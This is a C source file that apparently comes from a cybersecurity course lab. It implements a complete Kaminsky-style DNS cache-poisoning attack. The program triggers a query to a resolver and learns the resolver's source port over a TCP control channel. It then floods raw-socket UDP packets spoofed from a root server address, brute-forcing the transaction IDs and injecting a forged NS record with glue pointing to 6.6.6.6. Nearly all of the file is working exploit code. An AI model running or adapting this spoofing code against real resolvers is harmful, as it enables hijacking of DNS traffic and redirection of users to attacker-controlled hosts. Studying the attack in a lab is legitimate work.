#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <ldns/ldns.h>
#include <signal.h>
#include <sys/mman.h>  // for mprotect()
#include <time.h>      // for time()

// ----------------------
// Control-channel macros (from given file)
// ----------------------
#define DNS_TYPE_A 0x01
#define DNS_CLASS_IN 0x01
#define QWORD_SIZE 8
#define QUERY_SPOOF_GAP_US 5000  // 5 milliseconds 
#define PAGE_SIZE 4096
#define PROT_RWX (PROT_READ|PROT_WRITE|PROT_EXEC)
#define NUM_PAGES 2
#define BUF_SIZE 10
#define EXIT_OK 0
#define EXIT_ERROR 1

#define SERVER_IP "192.168.1.203"          // resolver IP (from given file)
#define ATTACKERS_SERVER_IP "192.168.1.201"
#define CLIENT_SERVER_PORT 12345

// ----------------------
// Attack constants (from our previous implementation)
// ----------------------

#define ROOT_IP_STR "192.168.1.204"

#define ROUNDS_COUNT       43U
#define SPOOFS_PER_ROUND   30000U

#define DNS_MAX_WIRE       512U
#define IP_HDR_LEN         20U
#define UDP_HDR_LEN        8U
#define MAX_PACKET_SIZE    (IP_HDR_LEN + UDP_HDR_LEN + DNS_MAX_WIRE)

// ----------------------
// Globals for control-channel (from given file, logic unchanged)
// ----------------------
int sockfd = -1;
int connfd = -1;




// ----------------------
// get_resolver_port() - GIVEN CODE (logic unchanged)
// Listens on TCP:12345, receives uint16_t net_port from attacker-server, returns it.
// ----------------------
uint16_t get_resolver_port()
{
    struct sockaddr_in servaddr, cli;

    // socket create and verification
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        exit(EXIT_ERROR);
    }
    // Set the SO_REUSEADDR and SO_REUSEPORT options on the socket
    int opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        close(sockfd);
        exit(EXIT_ERROR);
    }
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        close(sockfd);
        exit(EXIT_ERROR);
    }

    bzero(&servaddr, sizeof(servaddr));

    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(CLIENT_SERVER_PORT);

    // Binding newly created socket to given IP and verification
    int bind_attempts = 0;
    while (bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) != 0) {
        if (bind_attempts >= 3) {
            close(sockfd);
            exit(EXIT_ERROR);
        }
        sleep(5);
        bind_attempts++;
    }

    // Now server is ready to listen and verification
    if ((listen(sockfd, 5)) != 0) {
        close(sockfd);
        exit(EXIT_ERROR);
    }
    socklen_t len = sizeof(cli);

    // Accept the data packet from client and verification
    connfd = accept(sockfd, (struct sockaddr*)&cli, &len);
    if (connfd < 0) {
        close(sockfd);
        exit(EXIT_ERROR);
    }

    uint16_t resolver_port;
    ssize_t r = recv(connfd, &resolver_port, sizeof(resolver_port), MSG_WAITALL);
    if (r <= 0) {
        close(connfd); // Close the connection socket
        close(sockfd); // Close the listening socket
        exit(1);
    }

    // After chatting close the socket
    close(connfd); // Close the connection socket
    close(sockfd); // Close the listening socket

    return resolver_port;
}

// ----------------------
// Helper: generic 16-bit checksum (IP, pseudo-header, etc.)
// ----------------------
static uint16_t checksum16(const uint8_t *data, size_t len)
{
    uint32_t sum = 0U;
    size_t i = 0U;

    while (i + 1U < len) {
        uint16_t word = (uint16_t)((((uint32_t)data[i]) << 8U) | (uint32_t)data[i + 1U]);
        sum += word;
        i += 2U;
    }

    if (i < len) {
        uint16_t last = (uint16_t)(((uint32_t)data[i]) << 8U);
        sum += last;
    }

    while ((sum >> 16U) != 0U) {
        sum = (sum & 0xFFFFU) + (sum >> 16U);
    }

    return (uint16_t)(~sum);
}

// ----------------------
// Helper: UDP checksum (pseudo-header + UDP + DNS)
// ----------------------
static uint16_t udp_checksum(const uint8_t src_ip[4],
                             const uint8_t dst_ip[4],
                             const uint8_t *udp,
                             size_t udp_len)
{
    uint8_t pseudo[12U];
    size_t pos = 0U;

    pseudo[pos++] = src_ip[0];
    pseudo[pos++] = src_ip[1];
    pseudo[pos++] = src_ip[2];
    pseudo[pos++] = src_ip[3];

    pseudo[pos++] = dst_ip[0];
    pseudo[pos++] = dst_ip[1];
    pseudo[pos++] = dst_ip[2];
    pseudo[pos++] = dst_ip[3];

    pseudo[pos++] = 0x00U;
    pseudo[pos++] = 17U;  // UDP
    pseudo[pos++] = (uint8_t)((udp_len >> 8) & 0xFFU);
    pseudo[pos++] = (uint8_t)(udp_len & 0xFFU);

    size_t total_len = sizeof(pseudo) + udp_len;
    uint8_t *buf = (uint8_t *)malloc(total_len);
    if (buf == NULL) {
        exit(1);
    }

    memcpy(buf, pseudo, sizeof(pseudo));
    memcpy(buf + sizeof(pseudo), udp, udp_len);

    uint16_t result = checksum16(buf, total_len);
    free(buf);
    return result;
}

// ----------------------
// Random 16-bit helper
// ----------------------
static uint16_t random_u16(void)
{
    int r = rand();
    return (uint16_t)(r & 0xFFFF);
}


/**
 * Validates a spoofed DNS response packet
 * 
 * @param packet        The complete packet buffer (IP + UDP + DNS)
 * @param packet_len    Length of the packet
 * @param expected_txid Expected transaction ID
 * @param expected_qname Expected query name (e.g., "www.example.com")
 * @param expected_port Expected destination UDP port
 * @return 0 on success, -1 on validation failure
 */
static int validate_spoofed_packet(const uint8_t *packet,
                                   size_t packet_len,
                                   uint16_t expected_txid,
                                   const char *expected_qname,
                                   uint16_t expected_port)
{
    if (!packet || packet_len < (IP_HDR_LEN + UDP_HDR_LEN + 12)) {
        fprintf(stderr, "[VALIDATION] Packet too small: %zu bytes\n", packet_len);
        return -1;
    }

    // === IP Header Validation (manual parsing) ===
    const uint8_t *ip = packet;
    
    // Byte 0: Version (high 4 bits) and IHL (low 4 bits)
    uint8_t version = (ip[0] >> 4) & 0x0F;
    uint8_t ihl = ip[0] & 0x0F;
    
    if (version != 4) {
        fprintf(stderr, "[VALIDATION] Invalid IP version: %d\n", version);
        return -1;
    }
    
    if (ihl < 5) {
        fprintf(stderr, "[VALIDATION] Invalid IHL: %d\n", ihl);
        return -1;
    }
    
    size_t ip_header_len = ihl * 4;
    
    // Byte 9: Protocol
    uint8_t protocol = ip[9];
    if (protocol != IPPROTO_UDP) {
        fprintf(stderr, "[VALIDATION] Invalid protocol: %d (expected UDP=17)\n", protocol);
        return -1;
    }
    
    // Bytes 2-3: Total Length
    uint16_t total_len = ((uint16_t)ip[2] << 8) | ip[3];
    if (total_len != packet_len) {
        fprintf(stderr, "[VALIDATION] IP total length mismatch: %u (packet is %zu bytes)\n", 
                total_len, packet_len);
        // This might not be critical depending on your setup, so could be a warning
    }
    
    // Bytes 12-15: Source IP
    uint8_t src_ip[4];
    src_ip[0] = ip[12];
    src_ip[1] = ip[13];
    src_ip[2] = ip[14];
    src_ip[3] = ip[15];
    
    char src_ip_str[INET_ADDRSTRLEN];
    snprintf(src_ip_str, sizeof(src_ip_str), "%u.%u.%u.%u",
             src_ip[0], src_ip[1], src_ip[2], src_ip[3]);
    
    // Bytes 16-19: Destination IP
    uint8_t dst_ip[4];
    dst_ip[0] = ip[16];
    dst_ip[1] = ip[17];
    dst_ip[2] = ip[18];
    dst_ip[3] = ip[19];
    
    char dst_ip_str[INET_ADDRSTRLEN];
    snprintf(dst_ip_str, sizeof(dst_ip_str), "%u.%u.%u.%u",
             dst_ip[0], dst_ip[1], dst_ip[2], dst_ip[3]);
    
    // Validate source IP (should be spoofed as ROOT_IP_STR)
    if (strcmp(src_ip_str, ROOT_IP_STR) != 0) {
        fprintf(stderr, "[VALIDATION] Invalid source IP: %s (expected %s)\n", 
                src_ip_str, ROOT_IP_STR);
        return -1;
    }
    
    // Validate destination IP (should be SERVER_IP)
    if (strcmp(dst_ip_str, SERVER_IP) != 0) {
        fprintf(stderr, "[VALIDATION] Invalid dest IP: %s (expected %s)\n", 
                dst_ip_str, SERVER_IP);
        return -1;
    }

    // === UDP Header Validation (manual parsing) ===
    if (packet_len < ip_header_len + UDP_HDR_LEN) {
        fprintf(stderr, "[VALIDATION] Packet too small for UDP header\n");
        return -1;
    }
    
    const uint8_t *udp = packet + ip_header_len;
    
    // Bytes 0-1: Source Port
    uint16_t src_port = ((uint16_t)udp[0] << 8) | udp[1];
    
    // Bytes 2-3: Destination Port
    uint16_t dst_port = ((uint16_t)udp[2] << 8) | udp[3];
    
    // Bytes 4-5: Length
    uint16_t udp_len = ((uint16_t)udp[4] << 8) | udp[5];
    
    // Bytes 6-7: Checksum
    uint16_t udp_csum = ((uint16_t)udp[6] << 8) | udp[7];
    
    if (src_port != 53) {
        fprintf(stderr, "[VALIDATION] Invalid source port: %u (expected 53)\n", src_port);
        return -1;
    }
    
    if (dst_port != expected_port) {
        fprintf(stderr, "[VALIDATION] Invalid dest port: %u (expected %u)\n", 
                dst_port, expected_port);
        return -1;
    }
    
    // Validate UDP length
    size_t expected_udp_len = packet_len - ip_header_len;
    if (udp_len != expected_udp_len) {
        fprintf(stderr, "[VALIDATION] UDP length mismatch: %u (expected %zu)\n", 
                udp_len, expected_udp_len);
        return -1;
    }

    // === DNS Header Validation ===
    const uint8_t *dns = packet + ip_header_len + UDP_HDR_LEN;
    size_t dns_len = packet_len - ip_header_len - UDP_HDR_LEN;
    
    if (dns_len < 12) {
        fprintf(stderr, "[VALIDATION] DNS section too small: %zu bytes\n", dns_len);
        return -1;
    }

    // Bytes 0-1: Transaction ID
    uint16_t actual_txid = ((uint16_t)dns[0] << 8) | dns[1];
    if (actual_txid != expected_txid) {
        fprintf(stderr, "[VALIDATION] TXID mismatch: 0x%04X (expected 0x%04X)\n", 
                actual_txid, expected_txid);
        return -1;
    }

    // Bytes 2-3: Flags
    uint8_t flags_byte1 = dns[2];
    // uint8_t flags_byte2 = dns[3];
    
    // Check QR bit (bit 15, high bit of byte 2)
    if ((flags_byte1 & 0x80) == 0) {
        fprintf(stderr, "[VALIDATION] Not a DNS response (QR bit not set)\n");
        return -1;
    }

    // Bytes 4-5: Question Count (QDCOUNT)
    uint16_t qdcount = ((uint16_t)dns[4] << 8) | dns[5];
    
    // Bytes 6-7: Answer Count (ANCOUNT)
    uint16_t ancount = ((uint16_t)dns[6] << 8) | dns[7];
    
    // Bytes 8-9: Authority Count (NSCOUNT)
    // uint16_t nscount = ((uint16_t)dns[8] << 8) | dns[9];
    
    // Bytes 10-11: Additional Count (ARCOUNT)
    // uint16_t arcount = ((uint16_t)dns[10] << 8) | dns[11];
    
    if (qdcount != 1) {
        fprintf(stderr, "[VALIDATION] Invalid question count: %u (expected 1)\n", qdcount);
        return -1;
    }
    
    if (ancount < 1) {
        fprintf(stderr, "[VALIDATION] No answers in response (ancount=%u)\n", ancount);
        return -1;
    }

    // === QNAME Validation ===
    const uint8_t *qname_ptr = dns + 12;
    size_t qname_offset = 0;
    
    // Convert wire format QNAME to string
    char actual_qname[256];
    memset(actual_qname, 0, sizeof(actual_qname));
    size_t actual_qname_len = 0;
    
    while ((12 + qname_offset) < dns_len && qname_ptr[qname_offset] != 0) {
        uint8_t label_len = qname_ptr[qname_offset];
        
        if (label_len == 0) break;
        
        // Check for compression pointer (not expected in question section)
        if ((label_len & 0xC0) == 0xC0) {
            fprintf(stderr, "[VALIDATION] Unexpected compression in QNAME\n");
            return -1;
        }
        
        if (label_len > 63) {
            fprintf(stderr, "[VALIDATION] Invalid label length: %u\n", label_len);
            return -1;
        }
        
        qname_offset++;
        
        if ((12 + qname_offset + label_len) > dns_len) {
            fprintf(stderr, "[VALIDATION] QNAME extends beyond packet\n");
            return -1;
        }
        
        // Add dot separator if not first label
        if (actual_qname_len > 0) {
            if (actual_qname_len < sizeof(actual_qname) - 1) {
                actual_qname[actual_qname_len++] = '.';
            }
        }
        
        // Copy label characters
        for (uint8_t i = 0; i < label_len && actual_qname_len < sizeof(actual_qname) - 1; i++) {
            actual_qname[actual_qname_len++] = (char)qname_ptr[qname_offset++];
        }
    }
    actual_qname[actual_qname_len] = '\0';
    
    if (strcmp(actual_qname, expected_qname) != 0) {
        fprintf(stderr, "[VALIDATION] QNAME mismatch: '%s' (expected '%s')\n", 
                actual_qname, expected_qname);
        return -1;
    }
    
    // Skip null terminator and QTYPE/QCLASS (2+2 bytes)
    qname_offset++; // null terminator
    if ((12 + qname_offset + 4) > dns_len) {
        fprintf(stderr, "[VALIDATION] Incomplete question section\n");
        return -1;
    }
    
    uint16_t qtype = ((uint16_t)qname_ptr[qname_offset] << 8) | qname_ptr[qname_offset + 1];
    uint16_t qclass = ((uint16_t)qname_ptr[qname_offset + 2] << 8) | qname_ptr[qname_offset + 3];
    
    if (qtype != 1) { // A record
        fprintf(stderr, "[VALIDATION] Unexpected QTYPE: %u (expected 1 for A)\n", qtype);
        return -1;
    }
    
    if (qclass != 1) { // IN class
        fprintf(stderr, "[VALIDATION] Unexpected QCLASS: %u (expected 1 for IN)\n", qclass);
        return -1;
    }

    // === UDP Checksum Validation (optional but recommended) ===
    if (udp_csum != 0) {  // 0 means checksum disabled
        // Create a copy to zero out checksum field for validation
        uint8_t *udp_copy = malloc(udp_len);
        if (udp_copy) {
            memcpy(udp_copy, udp, udp_len);
            udp_copy[6] = 0;
            udp_copy[7] = 0;
            uint16_t computed_csum = udp_checksum(src_ip, dst_ip, udp_copy, udp_len);
            free(udp_copy);
            
            if (computed_csum != udp_csum) {
                fprintf(stderr, "[VALIDATION] UDP checksum mismatch: 0x%04X (expected 0x%04X)\n", 
                        udp_csum, computed_csum);
                return -1;
            }
        }
    }

    // printf("[VALIDATION] ✓ Packet valid: TXID=0x%04X, Port=%u, QNAME=%s\n",
    //        expected_txid, expected_port, expected_qname);
    // printf("             IP: %s -> %s\n", src_ip_str, dst_ip_str);
    // printf("             UDP: %u -> %u (len=%u)\n", src_port, dst_port, udp_len);
    // printf("             DNS: QD=%u AN=%u NS=%u AR=%u\n", qdcount, ancount, nscount, arcount);
    
    return 0;
}

// ----------------------
// Build DNS query (wire) for qname (A, IN)
// ----------------------
static int build_dns_query(uint8_t **out_wire, size_t *out_len, const char *qname)
{
    ldns_rdf *name = ldns_dname_new_frm_str(qname);
    if (name == NULL) {
        return -1;
    }

    ldns_pkt *pkt = ldns_pkt_query_new(name,
                                       DNS_TYPE_A,
                                       DNS_CLASS_IN,
                                       LDNS_RD);
    if (pkt == NULL) {
        ldns_rdf_deep_free(name);
        return -1;
    }

    ldns_pkt_set_id(pkt, random_u16());

    ldns_status status = ldns_pkt2wire(out_wire, pkt, out_len);

    ldns_pkt_free(pkt);
    if (status != LDNS_STATUS_OK) {
        return -1;
    }

    return 0;
}

// ----------------------
// Send one legitimate DNS query to resolver for qname
// ----------------------
static int send_legit_query(const char *qname)
{
    uint8_t *wire = NULL;
    size_t wire_len = 0U;
    if (build_dns_query(&wire, &wire_len, qname) != 0) {
        return 1;
    }

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        free(wire);
        return 1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(53U);
    if (inet_pton(AF_INET, SERVER_IP, &addr.sin_addr) != 1) {
        free(wire);
        close(sock);
        return 1;
    }

    if (sendto(sock, wire, (size_t)wire_len, 0,
               (struct sockaddr *)&addr, (socklen_t)sizeof(addr)) < 0) {
        free(wire);
        close(sock);
        return 1;
    }
    free(wire);
    close(sock);
    return 0;
}

// ----------------------
// Build DNS spoof with Kaminsky-style payload:
// Q:    qname IN A
// AUTH: qname IN NS ns.cybercourse.example.com
// ADD:  ns.cybercourse.example.com IN A 6.6.6.6
// ----------------------
static int build_dns_spoof(uint8_t **out_wire,
                           size_t *out_len,
                           const char *qname,
                           uint16_t txid)
{
    ldns_rdf *name = ldns_dname_new_frm_str(qname);
    if (name == NULL) {
        return -1;
    }

    ldns_pkt *pkt = ldns_pkt_query_new(name,
                                       LDNS_RR_TYPE_A,
                                       LDNS_RR_CLASS_IN,
                                       0U);
    if (pkt == NULL) {
        ldns_rdf_deep_free(name);
        return -1;
    }

    ldns_pkt_set_id(pkt, txid);
    ldns_pkt_set_qr(pkt, 1U); // response
    ldns_pkt_set_aa(pkt, 1U); // authoritative

    char answer_text[256]; //TODO change to memset
    (void)snprintf(answer_text, sizeof(answer_text),
                   "%s IN A 1.2.3.4",
                   qname);
    
    ldns_rr *answer_rr = NULL;
    ldns_status st = ldns_rr_new_frm_str(&answer_rr,
                                         answer_text,
                                         0,
                                         NULL,
                                         NULL);
    if (st != LDNS_STATUS_OK || answer_rr == NULL) {
        ldns_pkt_free(pkt);
        return -1;
    }
    
    // Push the answer to the ANSWER section
    ldns_pkt_push_rr(pkt, LDNS_SECTION_ANSWER, answer_rr);

    // NS record in AUTHORITY section
    char ns_text[256];
    (void)snprintf(ns_text, sizeof(ns_text),
                   "%s IN NS www.example1.cybercourse.example.com",
                   qname);

    ldns_rr *ns_rr = NULL;
    st = ldns_rr_new_frm_str(&ns_rr,
                             ns_text,
                             0,
                             NULL,
                             NULL);
    if (st != LDNS_STATUS_OK || ns_rr == NULL) {
        ldns_pkt_free(pkt);
        return -1;
    }

    // Glue record in ADDITIONAL section
    const char *a_name = "www.example1.cybercourse.example.com";
    char a_text[256];
    (void)snprintf(a_text, sizeof(a_text),
                   "%s IN A 6.6.6.6",
                   a_name);

    ldns_rr *a_rr = NULL;
    st = ldns_rr_new_frm_str(&a_rr,
                             a_text,
                             0,
                             NULL,
                             NULL);
    if (st != LDNS_STATUS_OK || a_rr == NULL) {
        ldns_rr_free(ns_rr);
        ldns_pkt_free(pkt);
        return -1;
    }

    ldns_pkt_push_rr(pkt, LDNS_SECTION_AUTHORITY, ns_rr);
    ldns_pkt_push_rr(pkt, LDNS_SECTION_ADDITIONAL, a_rr);

    ldns_status status = ldns_pkt2wire(out_wire, pkt, out_len);
    ldns_pkt_free(pkt);

    if (status != LDNS_STATUS_OK) {
        return -1;
    }
    return 0;
}

// ----------------------
// Build full IP+UDP+DNS packet into buf
// src:  root IP:53
// dst:  resolver IP:resolver_port
// ----------------------
static int build_spoofed_ip_packet(uint8_t *buf,
                                   size_t *out_len,
                                   const uint8_t *dns_wire,
                                   size_t dns_len,
                                   uint16_t dst_port)
{
    if (dns_len > DNS_MAX_WIRE) {
        return -1;
    }

    uint8_t src_ip[4];
    uint8_t dst_ip[4];
    if (inet_pton(AF_INET, ROOT_IP_STR, src_ip) != 1) {
        return -1;
    }
    if (inet_pton(AF_INET, SERVER_IP, dst_ip) != 1) {
        return -1;
    }

    size_t ip_header_start = 0U;
    size_t udp_header_start = ip_header_start + IP_HDR_LEN;
    size_t dns_start = udp_header_start + UDP_HDR_LEN;

    size_t ip_total_len = (size_t)(IP_HDR_LEN + UDP_HDR_LEN + dns_len);
    if (ip_total_len > MAX_PACKET_SIZE) {
        return -1;
    }

    memset(buf, 0, ip_total_len);

    // IP header
    uint8_t *ip = buf + ip_header_start;
    ip[0] = 0x45U;  // Version=4, IHL=5
    ip[1] = 0x00U;  // DSCP/ECN
    ip[2] = (uint8_t)((ip_total_len >> 8) & 0xFFU);
    ip[3] = (uint8_t)(ip_total_len & 0xFFU);
    ip[4] = 0x00U;  // Identification
    ip[5] = 0x00U;
    ip[6] = 0x40U;  // Flags/Fragment offset (don't fragment)
    ip[7] = 0x00U;
    ip[8] = 64U;    // TTL
    ip[9] = 17U;    // Protocol = UDP
    ip[10] = 0x00U; // checksum (to be filled)
    ip[11] = 0x00U;

    ip[12] = src_ip[0];
    ip[13] = src_ip[1];
    ip[14] = src_ip[2];
    ip[15] = src_ip[3];
    ip[16] = dst_ip[0];
    ip[17] = dst_ip[1];
    ip[18] = dst_ip[2];
    ip[19] = dst_ip[3];

    // UDP header
    uint8_t *udp = buf + udp_header_start;
    uint16_t src_port = 53U;
    uint16_t udp_len = (uint16_t)(UDP_HDR_LEN + dns_len);

    udp[0] = (uint8_t)((src_port >> 8) & 0xFFU);
    udp[1] = (uint8_t)(src_port & 0xFFU);
    udp[2] = (uint8_t)((dst_port >> 8) & 0xFFU);
    udp[3] = (uint8_t)(dst_port & 0xFFU);
    udp[4] = (uint8_t)((udp_len >> 8) & 0xFFU);
    udp[5] = (uint8_t)(udp_len & 0xFFU);
    udp[6] = 0x00U; // checksum (to be filled)
    udp[7] = 0x00U;

    // DNS payload
    memcpy(buf + dns_start, dns_wire, dns_len);

    // IP checksum
    uint16_t ip_chksum = checksum16(ip, IP_HDR_LEN);
    ip[10] = (uint8_t)((ip_chksum >> 8) & 0xFFU);
    ip[11] = (uint8_t)(ip_chksum & 0xFFU);

    // UDP checksum
    uint16_t udp_chksum = udp_checksum(src_ip, dst_ip, udp, (size_t)udp_len);
    udp[6] = (uint8_t)((udp_chksum >> 8) & 0xFFU);
    udp[7] = (uint8_t)(udp_chksum & 0xFFU);

    *out_len = ip_total_len;
    return 0;
}


// ----------------------
// Send a burst of spoofed packets for given qname and resolver_port
// using a raw IP socket (AF_INET, SOCK_RAW, IPPROTO_UDP)
// ----------------------
static int send_spoof_burst(int raw_sock,
                             const char *qname,
                             uint16_t resolver_port)
{
    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port   = htons(resolver_port);
    if (inet_pton(AF_INET, SERVER_IP, &dst.sin_addr) != 1) {
        return 1;
    }

    // Start TXID from a random 16-bit value and then walk forward
    uint16_t start_txid = random_u16();

    // 1. Build a single DNS spoof (wire format) for this qname
    uint8_t *dns_wire = NULL;
    size_t   dns_len  = 0U;
    if (build_dns_spoof(&dns_wire, &dns_len, qname, start_txid) != 0) {
        return 1;
    }

    // 2. Build a single IP+UDP template packet that wraps this DNS wire
    uint8_t base_packet[MAX_PACKET_SIZE];
    size_t  base_len = 0U;
    if (build_spoofed_ip_packet(base_packet,
                                &base_len,
                                dns_wire,
                                dns_len,
                                resolver_port) != 0) {
        fprintf(stderr, "build_spoofed_ip_packet() failed\n");
        free(dns_wire);
        return 1;
    }

    // 3. Pre-compute info needed for UDP checksum update
    uint8_t src_ip[4];
    uint8_t dst_ip[4];
    if (inet_pton(AF_INET, ROOT_IP_STR, src_ip) != 1) {
        perror("inet_pton ROOT_IP_STR failed");
        free(dns_wire);
        return 1;
    }
    if (inet_pton(AF_INET, SERVER_IP, dst_ip) != 1) {
        perror("inet_pton SERVER_IP failed");
        free(dns_wire);
        return 1;
    }

    const size_t ip_header_start  = 0U;
    const size_t udp_header_start = ip_header_start + IP_HDR_LEN;
    const size_t dns_start        = udp_header_start + UDP_HDR_LEN;
    const uint16_t udp_len        = (uint16_t)(UDP_HDR_LEN + dns_len);

    // 4. Send the burst: copy base_packet, patch TXID, recompute UDP checksum
    // int first = 1;
    for (uint32_t i = 0U; i < SPOOFS_PER_ROUND; ++i) {
        uint16_t txid = (uint16_t)(start_txid + i);  // wraps modulo 2^16

        uint8_t packet[MAX_PACKET_SIZE];
        memcpy(packet, base_packet, base_len);

        // Patch TXID in DNS header (first 2 bytes of DNS)
        uint8_t *dns = packet + dns_start;
        dns[0] = (uint8_t)((txid >> 8) & 0xFFU);
        dns[1] = (uint8_t)(txid & 0xFFU);

        // Recompute UDP checksum (pseudo header + UDP header + DNS payload)
        uint8_t *udp = packet + udp_header_start;
        udp[6] = 0x00U;  // clear old checksum
        udp[7] = 0x00U;
        uint16_t csum = udp_checksum(src_ip, dst_ip, udp, udp_len);
        udp[6] = (uint8_t)((csum >> 8) & 0xFFU);
        udp[7] = (uint8_t)(csum & 0xFFU);

        if (validate_spoofed_packet(packet, base_len, txid, qname
                                    , resolver_port) != 0) {
            fprintf(stderr, "Packet validation failed for TXID=0x%04X\n", txid);
            exit(1);
            // continue; // skip sending invalid packet
        }
        
        if (sendto(raw_sock, packet, base_len, 0, (struct sockaddr *)&dst, (socklen_t)sizeof(dst)) < 0) {
            free(dns_wire);
            return 1;
        }   
    }

    free(dns_wire);
    return 0;
}


// ----------------------
// Generate wwXXXX.example1.cybercourse.example.com
// ----------------------
static void make_random_qname(char *buf, size_t buf_len)
{
    uint16_t rnd = random_u16();
    (void)snprintf(buf, buf_len,
                   "ww%u.example1.cybercourse.example.com",
                   (unsigned int)rnd);
}

// ----------------------
// main(): glue everything together
// ----------------------
int main(void)
{
    // Seed RNG
    unsigned int seed = (unsigned int)time(NULL);
    srand(seed);

    // 1. Send a legit DNS query for the attacker domain,
    //    so attacker-server can observe resolver's UDP source port.
    if(send_legit_query("www.attacker.cybercourse.example.com") != 0) {
        exit(1);
    }

    // 2. Run the given TCP control-channel code to receive the resolver port
    uint16_t resolver_port = get_resolver_port();

    // 3. Open a raw IP socket and launch the Kaminsky-style attack
    int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (raw_sock < 0) {
        exit(1);
    }

    int one = 1;
    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, (socklen_t)sizeof(one)) < 0) {
        close(raw_sock);
        exit(1);
    }

    for (uint32_t round = 0U; round < ROUNDS_COUNT; ++round) {
        char qname[256];
        make_random_qname(qname, sizeof(qname));

        // Trigger query for this random subdomain
        if(send_legit_query(qname) != 0) {
            close(raw_sock);
            exit(1);
        }

        usleep(QUERY_SPOOF_GAP_US);  

        // Race the genuine answer with spoofed responses
        if(send_spoof_burst(raw_sock, qname, resolver_port) != 0) {
            close(raw_sock);
            exit(1);
        }
    }

    close(raw_sock);
    return 0;
}
